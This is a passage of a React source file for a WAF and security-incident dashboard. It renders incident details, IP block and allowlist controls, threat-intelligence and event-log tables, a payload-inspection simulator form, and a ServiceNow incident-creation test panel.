                          <td style={{ padding: '0.65rem 0.5rem' }}>{getStatusBadge(inc.status)}</td>
                          <td style={{ padding: '0.65rem 0.5rem', fontFamily: 'monospace', color: 'var(--accent-crimson)', fontWeight: 600 }}>
                            {inc.servicenow_number || '—'}
                          </td>
                          <td style={{ padding: '0.65rem 0.5rem' }}>
                            <button
                              onClick={(e) => {
                                e.stopPropagation();
                                fetchIncidentDetails(inc.id);
                              }}
                              className="btn btn-sm btn-secondary"
                              style={{ fontSize: '0.72rem', padding: '0.2rem 0.45rem' }}
                            >
                              Inspect
                            </button>
                          </td>
                        </tr>
                      );
                    })}
                  </tbody>
                </table>
              </div>
            )}
          </div>

          {/* Incident Detail Drawer */}
          {selectedIncident && (
            <div
              className="glass-panel"
              style={{
                background: '#ffffff',
                border: '1px solid var(--border-subtle)',
                borderRadius: 'var(--radius-lg)',
                padding: '1.25rem',
                display: 'flex',
                flexDirection: 'column',
                justifyContent: 'space-between',
              }}
            >
              <div>
                <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.75rem' }}>
                  <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
                    <span style={{ fontSize: '1rem', fontWeight: 800, color: 'var(--text-primary)' }}>
                      {selectedIncident.id}
                    </span>
                    {getSeverityBadge(selectedIncident.severity)}
                    {getStatusBadge(selectedIncident.status)}
                  </div>
                  <button
                    onClick={() => setSelectedIncident(null)}
                    style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--text-muted)' }}
                  >
                    ✕
                  </button>
                </div>

                <h4 style={{ fontSize: '1.05rem', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '0.5rem' }}>
                  {selectedIncident.title}
                </h4>
                <p style={{ fontSize: '0.825rem', color: 'var(--text-secondary)', lineHeight: 1.5, marginBottom: '1rem', whiteSpace: 'pre-line' }}>
                  {selectedIncident.description}
                </p>

                {/* Metadata Grid */}
                <div
                  style={{
                    background: 'var(--bg-primary)',
                    padding: '0.75rem',
                    borderRadius: 'var(--radius-md)',
                    border: '1px solid var(--border-subtle)',
                    display: 'grid',
                    gridTemplateColumns: '1fr 1fr',
                    gap: '0.5rem',
                    fontSize: '0.78rem',
                    marginBottom: '1rem',
                  }}
                >
                  <div>
                    <span style={{ color: 'var(--text-muted)', display: 'block' }}>ServiceNow Ticket:</span>
                    <strong style={{ color: 'var(--accent-crimson)', fontFamily: 'monospace' }}>
                      {selectedIncident.servicenow_number || 'N/A'}
                    </strong>
                  </div>
                  <div>
                    <span style={{ color: 'var(--text-muted)', display: 'block' }}>Source IP:</span>
                    <strong style={{ fontFamily: 'monospace' }}>{selectedIncident.source_ip || 'N/A'}</strong>
                  </div>
                  <div>
                    <span style={{ color: 'var(--text-muted)', display: 'block' }}>Created At:</span>
                    <span>{new Date(selectedIncident.created_at).toLocaleString()}</span>
                  </div>
                  <div>
                    <span style={{ color: 'var(--text-muted)', display: 'block' }}>Assigned Analyst:</span>
                    <strong>{selectedIncident.assigned_to || 'Unassigned'}</strong>
                  </div>
                </div>

                {/* Investigation Work Notes */}
                <h5 style={{ fontSize: '0.85rem', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '0.5rem' }}>
                  Investigation Work Notes ({selectedIncident.investigation_notes?.length || 0})
                </h5>
                <div
                  style={{
                    maxHeight: '180px',
                    overflowY: 'auto',
                    border: '1px solid var(--border-subtle)',
                    borderRadius: 'var(--radius-sm)',
                    padding: '0.65rem',
                    background: 'var(--bg-primary)',
                    marginBottom: '0.75rem',
                    display: 'flex',
                    flexDirection: 'column',
                    gap: '0.5rem',
                  }}
                >
                  {(selectedIncident.investigation_notes || []).map((n, idx) => (
                    <div key={idx} style={{ fontSize: '0.78rem', borderBottom: '1px dashed var(--border-subtle)', paddingBottom: '0.4rem' }}>
                      <div style={{ display: 'flex', justifyContent: 'space-between', color: 'var(--text-muted)', fontSize: '0.7rem' }}>
                        <strong>{n.author}</strong>
                        <span>{new Date(n.timestamp).toLocaleTimeString()}</span>
                      </div>
                      <div style={{ color: 'var(--text-primary)', marginTop: '0.2rem' }}>{n.text}</div>
                    </div>
                  ))}
                </div>

                {/* Add Note */}
                <div style={{ display: 'flex', gap: '0.5rem', marginBottom: '1rem' }}>
                  <input
                    type="text"
                    placeholder="Add work note to incident timeline..."
                    value={newNote}
                    onChange={(e) => setNewNote(e.target.value)}
                    style={{
                      flex: 1,
                      padding: '0.4rem 0.65rem',
                      fontSize: '0.8rem',
                      borderRadius: 'var(--radius-sm)',
                      border: '1px solid var(--border-subtle)',
                    }}
                  />
                  <button
                    onClick={handleAddIncidentNote}
                    disabled={savingNote || !newNote.trim()}
                    className="btn btn-sm btn-primary"
                    style={{ fontSize: '0.75rem' }}
                  >
                    Add
                  </button>
                </div>
              </div>

              {/* Status Action Buttons */}
              <div style={{ borderTop: '1px solid var(--border-subtle)', paddingTop: '0.75rem' }}>
                <span style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', fontWeight: 600, display: 'block', marginBottom: '0.4rem' }}>
                  Transition Status:
                </span>
                <div style={{ display: 'flex', gap: '0.4rem', flexWrap: 'wrap' }}>
                  {['INVESTIGATING', 'CONTAINED', 'RESOLVED', 'CLOSED'].map((st) => (
                    <button
                      key={st}
                      onClick={() => handleUpdateIncidentStatus(st)}
                      disabled={selectedIncident.status === st}
                      className="btn btn-sm btn-secondary"
                      style={{
                        fontSize: '0.72rem',
                        padding: '0.25rem 0.55rem',
                        opacity: selectedIncident.status === st ? 0.5 : 1,
                      }}
                    >
                      {st}
                    </button>
                  ))}
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {/* TAB 2: WAF IP CONTAINMENT */}
      {activeTab === 'waf_ips' && (
        <div className="glass-panel" style={{ background: '#ffffff', border: '1px solid var(--border-subtle)', padding: '1.25rem' }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '1rem', flexWrap: 'wrap', gap: '0.75rem' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
              <Lock size={18} color="#c2410c" />
              <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: 'var(--text-primary)' }}>
                Dynamic IP Threat Tracking & WAF Containment
              </h3>
            </div>

            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
              <select
                value={filterIpStatus}
                onChange={(e) => setFilterIpStatus(e.target.value)}
                style={{
                  fontSize: '0.78rem',
                  padding: '0.35rem 0.6rem',
                  borderRadius: 'var(--radius-sm)',
                  border: '1px solid var(--border-subtle)',
                  background: 'var(--bg-primary)',
                }}
              >
                <option value="ALL">All States</option>
                <option value="PERM_BLOCKED">Permanently Blocked</option>
                <option value="TEMP_BLOCKED">Temporarily Blocked</option>
                <option value="FLAGGED">Flagged</option>
                <option value="ALLOWLISTED">Allowlisted</option>
              </select>
            </div>
          </div>

          {loadingIps ? (
            <div style={{ textAlign: 'center', padding: '2.5rem', color: 'var(--text-secondary)' }}>
              Loading IP reputation table...
            </div>
          ) : ipReputations.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '2.5rem', color: 'var(--text-muted)' }}>
              No IP tracking records matching criteria.
            </div>
          ) : (
            <div style={{ overflowX: 'auto' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.825rem' }}>
                <thead>
                  <tr style={{ borderBottom: '1px solid var(--border-subtle)', textAlign: 'left', color: 'var(--text-secondary)' }}>
                    <th style={{ padding: '0.65rem 0.5rem' }}>IP Address</th>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Status</th>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Risk Score</th>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Violations</th>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Last Seen</th>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Reason</th>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Enforcement Actions</th>
                  </tr>
                </thead>
                <tbody>
                  {ipReputations.map((rep) => (
                    <tr key={rep.ip} style={{ borderBottom: '1px solid var(--border-subtle)' }}>
                      <td style={{ padding: '0.65rem 0.5rem', fontFamily: 'monospace', fontWeight: 700, color: 'var(--text-primary)' }}>
                        {rep.ip}
                      </td>
                      <td style={{ padding: '0.65rem 0.5rem' }}>{getIpStatusBadge(rep.status)}</td>
                      <td style={{ padding: '0.65rem 0.5rem', fontWeight: 700, color: rep.risk_score > 60 ? '#b91c1c' : '#b45309' }}>
                        {rep.risk_score} / 100
                      </td>
                      <td style={{ padding: '0.65rem 0.5rem', fontWeight: 600 }}>{rep.malicious_attempts}</td>
                      <td style={{ padding: '0.65rem 0.5rem', color: 'var(--text-secondary)' }}>
                        {new Date(rep.last_seen_at).toLocaleTimeString()}
                      </td>
                      <td style={{ padding: '0.65rem 0.5rem', color: 'var(--text-muted)', maxWidth: '200px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                        {rep.block_reason || '—'}
                      </td>
                      <td style={{ padding: '0.65rem 0.5rem' }}>
                        <div style={{ display: 'flex', gap: '0.35rem' }}>
                          {rep.status.includes('BLOCKED') ? (
                            <button
                              onClick={() => handleUnblockIp(rep.ip)}
                              className="btn btn-sm btn-secondary"
                              style={{ fontSize: '0.72rem', padding: '0.2rem 0.45rem', color: '#15803d' }}
                            >
                              Unblock
                            </button>
                          ) : (
                            <button
                              onClick={() => setBlockIpModal({ open: true, ip: rep.ip, isPerm: false })}
                              className="btn btn-sm btn-secondary"
                              style={{ fontSize: '0.72rem', padding: '0.2rem 0.45rem', color: '#b91c1c' }}
                            >
                              Block IP
                            </button>
                          )}
                          <button
                            onClick={() => handleAllowlistIp(rep.ip)}
                            className="btn btn-sm btn-secondary"
                            style={{ fontSize: '0.72rem', padding: '0.2rem 0.45rem' }}
                          >
                            Allowlist
                          </button>
                        </div>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      {/* TAB 3: THREAT INTELLIGENCE (TISC) */}
      {activeTab === 'threat_intel' && (
        <div className="glass-panel" style={{ background: '#ffffff', border: '1px solid var(--border-subtle)', padding: '1.25rem' }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '1rem', flexWrap: 'wrap', gap: '0.75rem' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
              <Radio size={18} color="#7c3aed" />
              <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: 'var(--text-primary)' }}>
                Threat Intelligence Indicators (TISC)
              </h3>
            </div>

            <button
              onClick={() => setNewIocModal(true)}
              className="btn btn-sm btn-primary"
              style={{ display: 'flex', alignItems: 'center', gap: '0.35rem', fontSize: '0.78rem' }}
            >
              <Plus size={14} />
              <span>Add IOC Indicator</span>
            </button>
          </div>

          {loadingTi ? (
            <div style={{ textAlign: 'center', padding: '2.5rem', color: 'var(--text-secondary)' }}>
              Loading threat intelligence indicators...
            </div>
          ) : threatIntel.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '2.5rem', color: 'var(--text-muted)' }}>
              No threat intelligence indicators active.
            </div>
          ) : (
            <div style={{ overflowX: 'auto' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.825rem' }}>
                <thead>
                  <tr style={{ borderBottom: '1px solid var(--border-subtle)', textAlign: 'left', color: 'var(--text-secondary)' }}>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Type</th>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Indicator Value</th>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Threat Actor</th>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Campaign</th>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Confidence</th>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Description</th>
                  </tr>
                </thead>
                <tbody>
                  {threatIntel.map((ti) => (
                    <tr key={ti.id} style={{ borderBottom: '1px solid var(--border-subtle)' }}>
                      <td style={{ padding: '0.65rem 0.5rem', fontWeight: 700, color: '#7c3aed' }}>{ti.type}</td>
                      <td style={{ padding: '0.65rem 0.5rem', fontFamily: 'monospace', fontWeight: 600, color: 'var(--text-primary)' }}>
                        {ti.value}
                      </td>
                      <td style={{ padding: '0.65rem 0.5rem', fontWeight: 600 }}>{ti.threat_actor || 'Unknown'}</td>
                      <td style={{ padding: '0.65rem 0.5rem', color: 'var(--text-secondary)' }}>{ti.campaign || 'General'}</td>
                      <td style={{ padding: '0.65rem 0.5rem', fontWeight: 700, color: ti.confidence > 80 ? '#b91c1c' : '#b45309' }}>
                        {ti.confidence}%
                      </td>
                      <td style={{ padding: '0.65rem 0.5rem', color: 'var(--text-secondary)', maxWidth: '280px' }}>
                        {ti.description}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      {/* TAB 4: SECURITY AUDIT LOG */}
      {activeTab === 'audit_events' && (
        <div className="glass-panel" style={{ background: '#ffffff', border: '1px solid var(--border-subtle)', padding: '1.25rem' }}>
          <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '1rem', flexWrap: 'wrap', gap: '0.75rem' }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
              <FileText size={18} color="var(--accent-crimson)" />
              <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: 'var(--text-primary)' }}>
                Real-Time WAF Security Events Log
              </h3>
            </div>

            {/* Event Filters */}
            <div style={{ display: 'flex', alignItems: 'center', gap: '0.5rem' }}>
              <input
                type="text"
                placeholder="Filter IP..."
                value={searchEvIp}
                onChange={(e) => setSearchEvIp(e.target.value)}
                style={{
                  fontSize: '0.78rem',
                  padding: '0.35rem 0.6rem',
                  borderRadius: 'var(--radius-sm)',
                  border: '1px solid var(--border-subtle)',
                  background: 'var(--bg-primary)',
                  width: '120px',
                }}
              />
              <select
                value={filterEvCategory}
                onChange={(e) => setFilterEvCategory(e.target.value)}
                style={{
                  fontSize: '0.78rem',
                  padding: '0.35rem 0.6rem',
                  borderRadius: 'var(--radius-sm)',
                  border: '1px solid var(--border-subtle)',
                  background: 'var(--bg-primary)',
                }}
              >
                <option value="ALL">All Categories</option>
                <option value="SQLI">SQL Injection</option>
                <option value="XSS">XSS</option>
                <option value="COMMAND_INJECTION">Command Injection</option>
                <option value="PATH_TRAVERSAL">Path Traversal</option>
                <option value="THREAT_INTEL">Threat Intel</option>
              </select>
            </div>
          </div>

          {loadingEvents ? (
            <div style={{ textAlign: 'center', padding: '2.5rem', color: 'var(--text-secondary)' }}>
              Loading security audit stream...
            </div>
          ) : events.length === 0 ? (
            <div style={{ textAlign: 'center', padding: '2.5rem', color: 'var(--text-muted)' }}>
              No events found matching criteria.
            </div>
          ) : (
            <div style={{ overflowX: 'auto' }}>
              <table style={{ width: '100%', borderCollapse: 'collapse', fontSize: '0.825rem' }}>
                <thead>
                  <tr style={{ borderBottom: '1px solid var(--border-subtle)', textAlign: 'left', color: 'var(--text-secondary)' }}>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Timestamp</th>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Source IP</th>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Category</th>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Action Taken</th>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Risk</th>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Matched Pattern</th>
                    <th style={{ padding: '0.65rem 0.5rem' }}>Payload Snippet</th>
                  </tr>
                </thead>
                <tbody>
                  {events.map((ev) => (
                    <tr key={ev.id} style={{ borderBottom: '1px solid var(--border-subtle)' }}>
                      <td style={{ padding: '0.65rem 0.5rem', color: 'var(--text-secondary)' }}>
                        {new Date(ev.timestamp).toLocaleTimeString()}
                      </td>
                      <td style={{ padding: '0.65rem 0.5rem', fontFamily: 'monospace', fontWeight: 600 }}>{ev.source_ip}</td>
                      <td style={{ padding: '0.65rem 0.5rem' }}>
                        <span
                          style={{
                            fontSize: '0.7rem',
                            fontWeight: 700,
                            padding: '0.15rem 0.4rem',
                            borderRadius: '4px',
                            background: ev.category === 'CLEAN' ? 'rgba(21, 128, 61, 0.12)' : 'rgba(185, 28, 28, 0.12)',
                            color: ev.category === 'CLEAN' ? '#15803d' : '#b91c1c',
                          }}
                        >
                          {ev.category}
                        </span>
                      </td>
                      <td style={{ padding: '0.65rem 0.5rem' }}>
                        <span
                          style={{
                            fontSize: '0.7rem',
                            fontWeight: 800,
                            padding: '0.15rem 0.45rem',
                            borderRadius: '4px',
                            background: ev.action_taken === 'BLOCKED' ? '#fee2e2' : '#e0f2fe',
                            color: ev.action_taken === 'BLOCKED' ? '#b91c1c' : '#0369a1',
                          }}
                        >
                          {ev.action_taken}
                        </span>
                      </td>
                      <td style={{ padding: '0.65rem 0.5rem', fontWeight: 700 }}>{ev.risk_score}</td>
                      <td style={{ padding: '0.65rem 0.5rem', fontFamily: 'monospace', color: 'var(--text-muted)' }}>
                        {ev.pattern_matched || '—'}
                      </td>
                      <td style={{ padding: '0.65rem 0.5rem', fontFamily: 'monospace', fontSize: '0.75rem', color: 'var(--text-primary)', maxWidth: '220px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                        {ev.payload_snippet || '—'}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      )}

      {/* TAB 5: INTERACTIVE WAF SIMULATOR */}
      {activeTab === 'simulator' && (
        <div style={{ display: 'grid', gridTemplateColumns: '1.2fr 1fr', gap: '1.5rem' }}>
          {/* Simulator Form & Presets */}
          <div className="glass-panel" style={{ background: '#ffffff', border: '1px solid var(--border-subtle)', padding: '1.25rem' }}>
            <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: 'var(--text-primary)', marginBottom: '0.35rem' }}>
              Interactive WAF Attack Vector Simulator
            </h3>
            <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '1rem' }}>
              Test how the GrantGate Web Application Firewall inspects incoming payloads, computes attack risk scores, matches signatures, and takes automatic containment decisions.
            </p>

            {/* Presets Bar */}
            <div style={{ marginBottom: '1.25rem' }}>
              <span style={{ fontSize: '0.75rem', fontWeight: 700, color: 'var(--text-secondary)', display: 'block', marginBottom: '0.4rem' }}>
                1-Click Attack Scenario Presets:
              </span>
              <div style={{ display: 'flex', flexDirection: 'column', gap: '0.4rem' }}>
                {attackPresets.map((p, idx) => (
                  <button
                    key={idx}
                    onClick={() => handleRunSimulation(p)}
                    className="btn btn-secondary"
                    style={{
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      padding: '0.5rem 0.75rem',
                      fontSize: '0.8rem',
                      textAlign: 'left',
                      background: p.category === 'CLEAN' ? 'rgba(21, 128, 61, 0.05)' : 'rgba(185, 28, 28, 0.04)',
                      borderColor: p.category === 'CLEAN' ? 'rgba(21, 128, 61, 0.2)' : 'rgba(185, 28, 28, 0.2)',
                    }}
                  >
                    <div>
                      <strong style={{ color: p.category === 'CLEAN' ? '#15803d' : '#b91c1c' }}>{p.name}</strong>
                      <span style={{ display: 'block', fontSize: '0.72rem', color: 'var(--text-muted)', fontFamily: 'monospace' }}>
                        {p.method} {p.path} ({p.ip})
                      </span>
                    </div>
                    <span style={{ fontSize: '0.72rem', fontWeight: 700, color: 'var(--text-secondary)' }}>
                      Risk: {p.risk}/100
                    </span>
                  </button>
                ))}
              </div>
            </div>

            {/* Custom Input Form */}
            <div style={{ borderTop: '1px solid var(--border-subtle)', paddingTop: '1rem' }}>
              <div style={{ display: 'grid', gridTemplateColumns: '120px 1fr', gap: '0.5rem', marginBottom: '0.5rem' }}>
                <div>
                  <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Method</label>
                  <select
                    value={simMethod}
                    onChange={(e) => setSimMethod(e.target.value)}
                    style={{ width: '100%', padding: '0.4rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
                  >
                    <option value="POST">POST</option>
                    <option value="GET">GET</option>
                    <option value="PUT">PUT</option>
                    <option value="DELETE">DELETE</option>
                  </select>
                </div>
                <div>
                  <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Source IP</label>
                  <input
                    type="text"
                    value={simIp}
                    onChange={(e) => setSimIp(e.target.value)}
                    style={{ width: '100%', padding: '0.4rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)', fontFamily: 'monospace' }}
                  />
                </div>
              </div>

              <div style={{ marginBottom: '0.5rem' }}>
                <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Target Endpoint</label>
                <input
                  type="text"
                  value={simPath}
                  onChange={(e) => setSimPath(e.target.value)}
                  style={{ width: '100%', padding: '0.4rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)', fontFamily: 'monospace' }}
                />
              </div>

              <div style={{ marginBottom: '0.75rem' }}>
                <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Request Payload Content</label>
                <textarea
                  rows={3}
                  value={simPayload}
                  onChange={(e) => setSimPayload(e.target.value)}
                  style={{ width: '100%', padding: '0.5rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)', fontFamily: 'monospace' }}
                />
              </div>

              <button
                onClick={() => handleRunSimulation()}
                disabled={simulating}
                className="btn btn-primary"
                style={{ width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.5rem' }}
                id="run-waf-sim-btn"
              >
                <Zap size={15} />
                <span>{simulating ? 'Analyzing in Gateway...' : 'Execute Live WAF Inspection'}</span>
              </button>
            </div>
          </div>

          {/* Simulator Result Output */}
          <div className="glass-panel" style={{ background: '#ffffff', border: '1px solid var(--border-subtle)', padding: '1.25rem' }}>
            <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: 'var(--text-primary)', marginBottom: '0.5rem' }}>
              Gateway Inspection Outcome
            </h3>

            {simResult ? (
              <div>
                {/* Decision Banner */}
                <div
                  style={{
                    padding: '1rem',
                    borderRadius: 'var(--radius-md)',
                    marginBottom: '1rem',
                    background: simResult.action_taken === 'BLOCKED' ? 'rgba(185, 28, 28, 0.12)' : 'rgba(21, 128, 61, 0.12)',
                    border: `1px solid ${simResult.action_taken === 'BLOCKED' ? '#b91c1c' : '#15803d'}`,
                  }}
                >
                  <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '0.3rem' }}>
                    <span style={{ fontSize: '0.75rem', fontWeight: 800, textTransform: 'uppercase', color: simResult.action_taken === 'BLOCKED' ? '#b91c1c' : '#15803d' }}>
                      Firewall Action
                    </span>
                    <span style={{ fontSize: '1.1rem', fontWeight: 800, color: simResult.action_taken === 'BLOCKED' ? '#b91c1c' : '#15803d' }}>
                      {simResult.action_taken}
                    </span>
                  </div>
                  <div style={{ fontSize: '0.85rem', fontWeight: 600, color: 'var(--text-primary)' }}>
                    Risk Score: {simResult.risk_score} / 100 ({simResult.severity})
                  </div>
                </div>

                {/* Details Breakdown */}
                <div style={{ display: 'flex', flexDirection: 'column', gap: '0.65rem', fontSize: '0.8rem' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid var(--border-subtle)', paddingBottom: '0.4rem' }}>
                    <span style={{ color: 'var(--text-secondary)' }}>Primary Category:</span>
                    <strong style={{ color: 'var(--text-primary)' }}>{simResult.category}</strong>
                  </div>

                  <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid var(--border-subtle)', paddingBottom: '0.4rem' }}>
                    <span style={{ color: 'var(--text-secondary)' }}>Signatures Matched:</span>
                    <strong style={{ color: 'var(--text-primary)' }}>{simResult.threats_detected?.length || 0}</strong>
                  </div>

                  {simResult.threats_detected && simResult.threats_detected.length > 0 && (
                    <div style={{ background: 'var(--bg-primary)', padding: '0.65rem', borderRadius: '4px' }}>
                      <span style={{ fontSize: '0.72rem', color: 'var(--text-muted)', display: 'block', marginBottom: '0.25rem' }}>
                        Detected Patterns:
                      </span>
                      {simResult.threats_detected.map((t: any, i: number) => (
                        <div key={i} style={{ fontFamily: 'monospace', fontSize: '0.75rem', color: '#b91c1c' }}>
                          • {t.pattern} (+{t.score_addition} pts)
                        </div>
                      ))}
                    </div>
                  )}

                  <div style={{ display: 'flex', justifyContent: 'space-between', borderBottom: '1px solid var(--border-subtle)', paddingBottom: '0.4rem' }}>
                    <span style={{ color: 'var(--text-secondary)' }}>Automatic SIR Ticket:</span>
                    <strong style={{ color: simResult.incident_id ? 'var(--accent-crimson)' : 'var(--text-muted)' }}>
                      {simResult.incident_id || 'Not required (below threshold)'}
                    </strong>
                  </div>

                  <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                    <span style={{ color: 'var(--text-secondary)' }}>IP Reputation Updated:</span>
                    <strong style={{ fontFamily: 'monospace' }}>{simResult.ip_reputation?.status || 'CLEAN'}</strong>
                  </div>
                </div>
              </div>
            ) : (
              <div style={{ textAlign: 'center', padding: '3rem', color: 'var(--text-muted)' }}>
                <Terminal size={32} style={{ margin: '0 auto 0.5rem', opacity: 0.5 }} />
                <p style={{ fontSize: '0.85rem' }}>Select a preset or enter a custom payload to trigger gateway evaluation.</p>
              </div>
            )}
          </div>
        </div>
      )}

      {/* TAB 6: SERVICENOW SIR INTEGRATION */}
      {activeTab === 'servicenow' && (
        <div style={{ display: 'grid', gridTemplateColumns: '1.2fr 1fr', gap: '1.5rem' }}>
          {/* Status & Test Creator */}
          <div className="glass-panel" style={{ background: '#ffffff', border: '1px solid var(--border-subtle)', padding: '1.25rem' }}>
            <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: 'var(--text-primary)', marginBottom: '0.35rem' }}>
              ServiceNow SecOps SIR Bi-Directional Adapter
            </h3>
            <p style={{ fontSize: '0.8rem', color: 'var(--text-secondary)', marginBottom: '1rem' }}>
              Demonstrates automatic incident creation in ServiceNow SIR table (<code>sn_si_incident</code>) upon zero-trust PDP purpose mismatch or high-risk attacks.
            </p>

            {/* Config & Health */}
            <div
              style={{
                background: 'var(--bg-primary)',
                padding: '0.85rem',
                borderRadius: 'var(--radius-md)',
                border: '1px solid var(--border-subtle)',
                marginBottom: '1.25rem',
                fontSize: '0.8rem',
              }}
            >
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.35rem' }}>
                <span style={{ color: 'var(--text-secondary)' }}>Instance Endpoint:</span>
                <strong style={{ fontFamily: 'monospace' }}>{snStatus?.instance_url || 'https://dev-secops.service-now.com'}</strong>
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '0.35rem' }}>
                <span style={{ color: 'var(--text-secondary)' }}>Target SIR Table:</span>
                <strong style={{ fontFamily: 'monospace' }}>sn_si_incident</strong>
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between' }}>
                <span style={{ color: 'var(--text-secondary)' }}>Adapter Mode:</span>
                <span style={{ color: '#15803d', fontWeight: 700 }}>
                  {snStatus?.mock_mode ? 'Deterministic Mock SIR Provider' : 'Live ServiceNow REST API'}
                </span>
              </div>
            </div>

            {/* Test Trigger Form */}
            <div style={{ borderTop: '1px solid var(--border-subtle)', paddingTop: '1rem' }}>
              <h4 style={{ fontSize: '0.9rem', fontWeight: 700, color: 'var(--text-primary)', marginBottom: '0.5rem' }}>
                Trigger Security Incident Creation Test:
              </h4>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '0.5rem', marginBottom: '0.5rem' }}>
                <div>
                  <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Violation Type</label>
                  <select
                    value={testSnViolation}
                    onChange={(e) => setTestSnViolation(e.target.value)}
                    style={{ width: '100%', padding: '0.4rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
                  >
                    <option value="DENY_PURPOSE_MISMATCH">Purpose Mismatch</option>
                    <option value="DENY_ACTION_NOT_GRANTED">Unauthorized Action</option>
                    <option value="DENY_IP_RESTRICTED">IP Restricted</option>
                    <option value="SQL_INJECTION">SQL Injection Attempt</option>
                  </select>
                </div>

                <div>
                  <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Caller Principal</label>
                  <input
                    type="text"
                    value={testSnCaller}
                    onChange={(e) => setTestSnCaller(e.target.value)}
                    style={{ width: '100%', padding: '0.4rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
                  />
                </div>
              </div>

              <div style={{ marginBottom: '0.75rem' }}>
                <label style={{ fontSize: '0.75rem', fontWeight: 600, color: 'var(--text-secondary)' }}>Declared / Rogue Purpose</label>
                <input
                  type="text"
                  value={testSnPurpose}
                  onChange={(e) => setTestSnPurpose(e.target.value)}
                  style={{ width: '100%', padding: '0.4rem', fontSize: '0.8rem', borderRadius: '4px', border: '1px solid var(--border-subtle)' }}
                />
              </div>

              <button
                onClick={handleTestServiceNow}
                disabled={testingSn}
                className="btn btn-primary"
                style={{ width: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '0.5rem' }}
                id="test-servicenow-btn"
              >
                <Server size={15} />
                <span>{testingSn ? 'Transmitting to ServiceNow...' : 'Auto-Open SIR Incident via Webhook'}</span>
              </button>
            </div>
          </div>

          {/* Inbound Webhook Simulator */}
          <div className="glass-panel" style={{ background: '#ffffff', border: '1px solid var(--border-subtle)', padding: '1.25rem' }}>
            <h3 style={{ fontSize: '1.05rem', fontWeight: 800, color: 'var(--text-primary)', marginBottom: '0.35rem' }}>
              Inbound ServiceNow Webhook Listener
            </h3>
